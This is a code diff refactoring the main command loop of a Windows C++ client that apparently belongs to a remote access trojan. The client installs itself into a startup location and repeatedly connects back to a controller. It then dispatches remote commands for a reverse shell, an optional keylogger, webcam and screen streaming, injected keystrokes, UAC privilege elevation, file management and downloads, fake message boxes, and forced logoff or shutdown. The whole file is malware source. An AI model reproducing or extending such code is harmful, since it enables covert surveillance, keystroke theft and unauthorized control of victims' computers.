@@ -2,8 +2,6 @@
 #include <winsock2.h>
 #include <chrono>
 #include <thread>
-#include "video_audio/DeviceEnumerator.h"
-#include <string>
 #include "stream/Stream.h"
 #include "download/Download.h"
 #include "file/FileManager.h"
@@ -18,13 +16,11 @@
 #include "configuration.h"
 
 
-
-
-int main(int argc=0,char*argv[]= nullptr) {
+int main(int argc = 0, char *argv[] = nullptr) {
     Sleep(argc);
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
     if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
-        Install::installClient(INSTALL_PATH,argv[0],SUBDIRECTORY_NAME,SUBDIRECTORY_FILE_NAME,STARTUP_NAME);
+        Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
         bool connectionState = true;
         while (connectionState) {
             std::cout << "trying to connect " << std::endl;
@@ -45,6 +41,11 @@ int main(int argc=0,char*argv[]= nullptr) {
                 FileManager fileManager(stream);
                 ReverseShell reverseShell(stream);
                 Download download(stream);
+                DeviceEnumerator deviceEnumerator(stream);
+                KeyboardExecuter keyboardExecuter(stream);
+                Permission permission(stream);
+                MessageBoxGUI messageBoxGui(stream);
+                ScreenStreamer screenStreamer(stream);
 #ifdef KEYLOGGER
                 KeyLogger keyLogger(stream);
                 keyLogger.tryStart();
@@ -52,7 +53,7 @@ int main(int argc=0,char*argv[]= nullptr) {
                 while (streamListening) {
                     int action = stream.readSize();
                     switch (action) {
-                        case -3:{ // Uninstall client
+                        case -3: { // Uninstall client
                             Install::uninstall();
                         }
                         case -2: { // Fully disconnect and close program
@@ -131,95 +132,48 @@ int main(int argc=0,char*argv[]= nullptr) {
                             break;
                         }
 #endif
-                        case 16: {
-
-
-
-                            DeviceEnumerator de;
-                            std::map<int, Device> devices = de.getVideoDevicesMap();
-                            std::vector<std::string> webcamVector;
-                            for (auto const &device: devices) {
-                                webcamVector.push_back(device.second.deviceName);
-                            }
-                            stream.sendList(webcamVector);
+                        case 16: { // send webcam devices
+                            deviceEnumerator.send();
                             break;
                         }
 #ifdef WEBCAM
-                            case 17: {
-
-                            std::cout << "START WEBCAM" << std::endl;
-                            std::string webcamName = stream.readString();
-                            bool fragmented = stream.readSize();
-                            int FPS = stream.readSize();
-                            DeviceEnumerator de;
-
-                            std::map<int, Device> devices = de.getVideoDevicesMap();
-                            for (auto &device: devices) {
-                                std::cout << "== AUDIO DEVICE (id:" << device.first << ") ==" << std::endl;
-                                std::cout << "Name: " << device.second.deviceName << std::endl;
-                                std::cout << "Path: " << device.second.devicePath << std::endl;
-                                if (device.second.deviceName == webcamName) {
-                                    WebcamManager webcam(stream, device.first, fragmented, FPS,WEBCAM);
-                                    webcam.startWebcam();
-                                }
-                            }
-
+                        case 17: { // start webcam with custom features
+                            WebcamManager webcamManager(stream);
+                            webcamManager.startWebcam();
                             break;
                         }
 #endif
-                        case 18: {
-                            std::cout << "keyboard command " << std::endl;
-                            std::string keyboardCommand = stream.readString();
-                            KeyboardExecuter keyboardExecuter(keyboardCommand);
-                            std::thread keyboardThread(&KeyboardExecuter::executeSequence, &keyboardExecuter);
-                            keyboardThread.detach();
+                        case 18: { // keyboard executer, execute custom order of keyboard strokes and delays
+                            keyboardExecuter.execute();
                             break;
                         }
-                        case 19: {
-                            std::cout << "has admin permission command " << std::endl;
-                            std::cout << Permission::hasAdminPermission() << std::endl;
-                            stream.sendSize(Permission::hasAdminPermission());
+                        case 19: { // send if system has admin privileges
+                            permission.send();
                             break;
                         }
-                        case 20: {
-                            std::cout << "elevate permission" << std::endl;
-                            BOOL result;
-                            result = Permission::elevatePermissions();
-                            if (result == 1) {
-                                stream.sendSize(1);
-                                return 0;
-                            }
-                            stream.sendSize(result);
+                        case 20: { // send result of UAC dialog
+                            permission.sendElevatedPermissions();
                             break;
                         }
-                        case 21: {
-                            std::cout << "SHOW MESSAGE BOX " << std::endl;
-                            std::string boxInformation = stream.readString();
-                            MessageBoxGUI messageBox(boxInformation);
-                            std::thread messageBoxThread(&MessageBoxGUI::showMessageGUI, &messageBox);
-                            messageBoxThread.detach();
+                        case 21: { // open messagebox with custom features
+                            messageBoxGui.send();
                             break;
                         }
 #ifdef WEBCAM
-                        case 22: {
-                            std::cout << "SCREEN STREAM" << std::endl;
-                            ScreenStreamer screenStreamer(stream);
-                            screenStreamer.sendPicture();
+                        case 22: { // start screen streaming
+                            screenStreamer.send();
                             break;
                         }
 #endif
-                        case 23: {
-                            std::cout << "LOG OFF" << std::endl;
+                        case 23: { // log off
                             SystemState::setState(0);
                             break;
                         }
-                        case 24: {
-                            std::cout << "SHUTDOWN " << std::endl;
+                        case 24: { // shutdown
                             SystemState::setState(1);
                             break;
                         }
-                        case 26: {
-                            std::cout << "RESTART " << std::endl;
+                        case 26: { // restart
                             SystemState::setState(2);
                             break;
                         }
@@ -233,10 +187,7 @@ int main(int argc=0,char*argv[]= nullptr) {
             std::this_thread::sleep_for(std::chrono::milliseconds(TIMING_RETRY));
         }
     }
-
     ReleaseMutex(hMutexHandle);
     CloseHandle(hMutexHandle);
     return 0;
-
-
 }
